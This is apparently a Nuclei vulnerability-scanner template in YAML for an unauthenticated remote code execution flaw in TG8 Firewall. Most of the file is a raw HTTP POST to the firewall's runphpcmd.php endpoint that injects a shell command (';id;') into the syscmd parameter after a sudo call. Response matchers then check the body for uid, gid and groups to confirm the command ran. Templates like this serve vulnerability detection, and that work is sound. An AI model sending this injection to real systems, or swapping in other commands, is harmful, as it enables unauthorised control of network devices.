id: TG8 Firewall PreAuth RCE
info:
  author: nithissh
  description: A malicious actor can trigger Un authenticated Remote Code Execution
  name: TG8 Firewall PreAuth RCE
  reference: unknown
  severity: critical
  tags: rce,tg8 firewall
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - uid
    - gid
    - groups
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST http://{{BaseURL}}/admin/runphpcmd.php HTTP/1.1\nHost: {{Hostname}} \nUser-Agent:\
    \ Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0\n\
    Accept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\n\
    Accept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded;\
    \ charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 68\nConnection:\
    \ keep-alive\n\nsyscmd=sudo+%2Fhome%2FTG8%2Fv3%2Fsyscmd%2Fcheck_gui_login.sh+%3Bid%3B++local\n"
